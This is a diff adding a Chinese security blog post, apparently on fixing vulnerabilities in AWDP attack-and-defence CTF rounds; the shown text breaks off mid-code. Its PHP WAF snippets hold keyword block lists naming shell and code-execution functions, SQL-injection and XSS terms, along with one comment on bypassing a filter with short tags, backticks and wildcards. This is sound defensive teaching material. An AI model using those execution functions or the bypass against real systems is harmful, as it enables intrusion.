@@ -1,0 +1,965 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="xiaolaisec">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://laijunyue.github.io/2025/11/04/awdp-专题/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="AWDP专题一、AWDP是什么AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。 AWDP一般分为两个模块，Break（自己的payload打通）和 Fix（让主办方的payload打不通），就是攻击和防御。 tips：Fix一般比Break容易，如果是同">
+<meta property="og:type" content="article">
+<meta property="og:title" content="AWDP 专题">
+<meta property="og:url" content="http://laijunyue.github.io/2025/11/04/AWDP-%E4%B8%93%E9%A2%98/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="AWDP专题一、AWDP是什么AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。 AWDP一般分为两个模块，Break（自己的payload打通）和 Fix（让主办方的payload打不通），就是攻击和防御。 tips：Fix一般比Break容易，如果是同">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-04T01:35:22.000Z">
+<meta property="article:modified_time" content="2025-11-06T01:18:21.166Z">
+<meta property="article:author" content="xiaolaisec">
+<meta property="article:tag" content="JAVA">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Python">
+<meta property="article:tag" content="AWDP">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/background.jpg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/background.jpg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/background.jpg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            AWDP 专题 -
+        
+        Welcome to xiaolaisec&#39;s blog
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    
+        <style>
+    :root {
+        --preloader-background-color: #fff;
+        --preloader-text-color: #000;
+    }
+
+    @media (prefers-color-scheme: dark) {
+        :root {
+            --preloader-background-color: #202124;
+            --preloader-text-color: #fff;
+        }
+    }
+
+    @media (prefers-color-scheme: light) {
+        :root {
+            --preloader-background-color: #fff;
+            --preloader-text-color: #000;
+        }
+    }
+
+    @media (max-width: 600px) {
+        .ml13 {
+            font-size: 2.6rem !important; /* Adjust this value as needed */
+        }
+    }
+
+    .preloader {
+        display: flex;
+        flex-direction: column;
+        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
+        align-items: center;
+        justify-content: center;
+        position: fixed;
+        padding: 12px;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        left: 0;
+        width: 100vw;
+        height: 100vh; /* 'h-screen' is 100% of the viewport height */
+        background-color: var(--preloader-background-color);
+        z-index: 1100; /* 'z-[1100]' sets the z-index */
+        transition: opacity 0.2s ease-in-out;
+    }
+
+    .ml13 {
+        font-size: 3.2rem;
+        /* text-transform: uppercase; */
+        color: var(--preloader-text-color);
+        letter-spacing: -1px;
+        font-weight: 500;
+        font-family: 'Chillax-Variable', sans-serif;
+        text-align: center;
+    }
+
+    .ml13 .word {
+        display: inline-flex;
+        flex-wrap: wrap;
+        white-space: nowrap;
+    }
+
+    .ml13 .letter {
+        display: inline-block;
+        line-height: 1em;
+    }
+</style>
+
+<div class="preloader">
+    
+<script src="/js/libs/anime.min.js"></script>
+
+    <h1 class="ml13">
+        Welcome to xiaolaisec&#39;s blog
+    </h1>
+    <script>
+        var textWrapper = document.querySelector('.ml13');
+        // Split text into words
+        var words = textWrapper.textContent.trim().split(' ');
+
+        // Clear the existing content
+        textWrapper.innerHTML = '';
+
+        // Wrap each word and its letters in spans
+        words.forEach(function(word) {
+            var wordSpan = document.createElement('span');
+            wordSpan.classList.add('word');
+            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
+            textWrapper.appendChild(wordSpan);
+            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
+        });
+
+
+        anime.timeline({loop: true})
+            .add({
+                targets: '.ml13 .letter',
+                translateY: [100,0],
+                translateZ: 0,
+                opacity: [0,1],
+                easing: "easeOutExpo",
+                duration: 1400,
+                delay: (el, i) => 300 + 30 * i
+            }).add({
+            targets: '.ml13 .letter',
+            translateY: [0,-100],
+            opacity: [1,0],
+            easing: "easeInExpo",
+            duration: 1200,
+            delay: (el, i) => 100 + 30 * i
+        });
+
+        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;
+
+        // If the theme status is not found in local storage, check the preferred color scheme
+        if (themeStatus === undefined || themeStatus === null) {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                themeStatus = 'dark';
+            } else {
+                themeStatus = 'light';
+            }
+        }
+
+        // Now you can use the themeStatus variable in your code
+        if (themeStatus) {
+            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
+            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
+        } else {
+            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
+            document.documentElement.style.setProperty('--preloader-text-color', '#000');
+        }
+
+        window.addEventListener('load', function () {
+            hidePreloaderAfterTimeout(1000); // Hide after 1000 milliseconds once the window has loaded
+        });
+
+        // Backup failsafe: Hide preloader after a maximum of 5000 milliseconds, regardless of the window load event
+        hidePreloaderAfterTimeout(5000);
+
+        function hidePreloaderAfterTimeout(delay) {
+            setTimeout(function () {
+                var preloader = document.querySelector('.preloader');
+                preloader.style.opacity = '0';
+                setTimeout(function () {
+                    preloader.style.display = 'none';
+                }, 200);
+            }, delay);
+        }
+    </script>
+</div>
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"laijunyue.github.io","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left","delete_mask":false,"headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null},"highlight_theme":{"light":"github","dark":"vs2015"}},"toc":{"enable":true,"max_depth":6,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]},"pangu_js":false},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null},"side_tools":{"gear_rotation":true,"auto_expand":false}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/background.jpg","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"xiaolaisec's blog","subtitle":{"text":["欢迎来到我的博客(｡･∀･)ﾉﾞ","悟已往之不谏，知来者之可追...","随心所欲地享受每一天\\(￣︶￣*\\))","随时随地，浏览记录O(∩_∩)O","如果喜欢，建议给个支持( •̀ ω •́ )✧","喜欢的话，留个言好嘛(oﾟvﾟ)ノ","你有建议？反馈作者(●^◡^●)","文字正在不断轮换(*￣3￣)╭","正在努力更新博客(ง •_•)ง","正在不断努力改善博客中ε=( o｀ω′)ノ"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn","show_author":false},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null},"style":"default"}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.6.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true},"width":{"home":"1200px","pages":"1000px"}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":null,"show_on_mobile":true},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3},"excerpt_length":200},"footerStart":"2022/8/17 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+<!--        <span class="swup-progress-icon">-->
+<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+<!--        </span>-->
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Welcome to xiaolaisec&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer h-screen w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">18</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">0</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">31</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container flex relative justify-between box-border w-full h-full">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                <div class="w-full flex items-center pt-6 justify-start">
+                    <h1 class="article-title-regular text-second-text-color text-4xl md:text-6xl font-bold px-2 sm:px-6 md:px-8 py-3">AWDP 专题</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/xiaolai.jpg">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">xiaolaisec</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-11-04 09:35:22</span>
+        <span class="mobile">2025-11-04 09:35:22</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-11-06 09:18:21</span>
+            <span class="mobile">2025-11-06 09:18:21</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/JAVA/">JAVA</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/PHP/">PHP</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/Python/">Python</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/AWDP/">AWDP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <h1 id="AWDP专题"><a href="#AWDP专题" class="headerlink" title="AWDP专题"></a>AWDP专题</h1><h2 id="一、AWDP是什么"><a href="#一、AWDP是什么" class="headerlink" title="一、AWDP是什么"></a>一、AWDP是什么</h2><p>AWDP是一种综合考核参赛团队攻击、防御技术能力、即时策略的攻防兼备比赛模式。每个参赛队互为攻击方和防守方，充分体现比赛的实战性、实时性和对抗性，对参赛队的渗透能力和防护能力进行综合全面的考量。</p>
+<p>AWDP一般分为两个模块，<strong>Break</strong>（自己的payload打通）和 <strong>Fix</strong>（让主办方的payload打不通），就是攻击和防御。</p>
+<p><strong>tips</strong>：Fix一般比Break容易，如果是同时进行的，优先Fix。如果不是同时进行的，Break时候建议思考Fix。</p>
+<h2 id="二、常见FIX手段"><a href="#二、常见FIX手段" class="headerlink" title="二、常见FIX手段"></a>二、常见FIX手段</h2><p><strong>通用</strong>：上WAF、注释或删除漏洞语句</p>
+<p>SQL注入：上WAF拦截关键字(select、show、sleep、table…)、addslashes() 函数过滤、预处理</p>
+<p>SSRF：上WAF拦截关键字(127.0.0.1、localhost、gopher、file、dict、zip、ftp…)</p>
+<p>XSS：一般不常见，主要无法直接RCE，需要水坑钓鱼，但如果服务器后端是NodeJs就可以RCE，上WAF拦截关键字</p>
+<p>任意文件读取：将文件路径写死</p>
+<p>SSTI：python中可将<code>render_template_string()</code>改为<code>render_template()</code></p>
+<p>原型链污染：注释污染相关代码即可，例如<code>merge(src, dst)函数</code></p>
+<p>文件上传：后缀强校验、文件后缀名白名单、文件内容WAF、MIMA头（最好一次都修上）</p>
+<p>JAVA：注释或删除漏洞语句、上调库版本、上WAF</p>
+<p>代码审计：上WAF、注释漏洞代码</p>
+<h2 id="三、WAF写法"><a href="#三、WAF写法" class="headerlink" title="三、WAF写法"></a>三、WAF写法</h2><h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$str1</span> =<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$str1</span>.=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$str1</span>.=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str2</span> =<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$str2</span>.=<span class="variable">$key</span>;</span><br><span class="line">    <span class="variable">$str2</span>.=<span class="variable">$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|tail|flag|\&#x27;|\&quot;|\&lt;|\&#123;|\&#125;|exec|base64|phpinfo|&lt;\?|\&quot;/i&quot;</span>, <span class="variable">$str1</span>)||<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|tail|flag|\&#x27;|\&quot;|\&lt;|\&#123;|\&#125;|exec|base64|phpinfo|&lt;\?|\&quot;/i&quot;</span>, <span class="variable">$str2</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;no!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//RCE</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafrce</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//以下这个可以用短标签+反引号+通配符绕过过滤</span></span><br><span class="line"><span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\^|\||\~|assert|print|include|require|\(|echo|flag|data|php|glob|sys|phpinfo|POST|GET|REQUEST|exec|pcntl|popen|proc|socket|link|passthru|file|posix|ftp|\_|disk|tcp|cat|tac/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//SQL</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafsqli</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|table|flag|union|\\\\$|\&#x27;|\&quot;|--|#|\\0|into|alert|img|prompt|set|/\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\=|or|\x7c|select|and|flag|into|where|\x26|\&#x27;|\&quot;|union|\`|sleep|benchmark|regexp|from|count|procedure|and|ascii|substr|substring|left|right|union|if|case|pow|exp|order|sleep|benchmark|into|load|outfile|dumpfile|load_file|join|show|select|update|set|concat|delete|alter|insert|create|union|or|drop|not|for|join|is|between|group_concat|like|where|user|ascii|greatest|mid|substr|left|right|char|hex|ord|case|limit|conv|table|mysql_history|flag|count|rpad|\&amp;|\*|\.|/is&quot;</span>,<span class="variable">$s</span>)||<span class="title function_ invoke__">strlen</span>(<span class="variable">$s</span>)&gt;<span class="number">50</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: /&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//addslashes() 函数,放到漏洞点的最前面</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_REQUEST</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$value</span>) &#123;</span><br><span class="line">    <span class="variable">$_POST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="variable">$_GET</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="variable">$_REQUEST</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//XSS</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafxss</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafrce</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|scandir|assert|pcntl_exec|fwrite|curl|system|eval|assert|flag|passthru|exec|chroot|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafsqli</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/select|and|\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleexml|extractvalue|+|regex|copy|read|file|create|grand|dir|insert|link|server|drop|=|&gt;|&lt;|;|\&quot;|\&#x27;|\^|\|/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">wafxss</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&#x27;|http|\&quot;|\`|cookie|&lt;|&gt;|script/i&quot;</span>, <span class="variable">$str</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// fix后(XXE)</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">is_user_exists</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$user_info_dir</span></span>): <span class="title">bool</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$dirs</span> = <span class="title function_ invoke__">array_filter</span>(<span class="title function_ invoke__">glob</span>(<span class="variable">$user_info_dir</span> . <span class="string">&#x27;/*&#x27;</span>), <span class="string">&#x27;is_dir&#x27;</span>);</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$dirs</span> <span class="keyword">as</span> <span class="variable">$dir</span>) &#123;</span><br><span class="line">            <span class="variable">$dirName</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$dir</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$dirName</span> === <span class="variable">$username</span>) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">register_user</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$user_info_dir</span>, <span class="variable">$user_xml</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="string">&quot;/php|read|flag/i&quot;</span>;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$r</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$username</span>);</span><br><span class="line">        <span class="variable">$user_dir_name</span> = <span class="variable">$user_info_dir</span>.<span class="variable">$username</span>;</span><br><span class="line">        <span class="title function_ invoke__">mkdir</span>(<span class="variable">$user_dir_name</span>, <span class="number">0777</span>);</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$user_dir_name</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$username</span>.<span class="string">&quot;.xml&quot;</span>, <span class="variable">$user_xml</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_user_record</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$user_info_dir</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$r</span> = <span class="string">&quot;/php|read|flag/i&quot;</span>;</span><br><span class="line">        <span class="variable">$username</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$r</span>,<span class="string">&quot;&quot;</span>,<span 